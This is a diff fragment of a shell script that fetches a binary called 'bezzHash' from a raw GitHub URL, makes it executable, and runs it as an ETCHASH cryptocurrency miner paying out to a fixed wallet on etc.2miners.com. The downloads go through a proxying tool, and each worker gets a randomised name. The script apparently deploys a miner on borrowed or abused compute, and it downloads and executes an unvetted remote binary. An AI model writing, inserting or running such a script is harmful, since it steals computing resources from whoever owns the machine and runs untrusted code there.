@@ -42,8 +42,5 @@ echo " "
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/WxYtzaiu/WxYtzaiu/main/bezzHash
 chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-
-./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
+./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
 
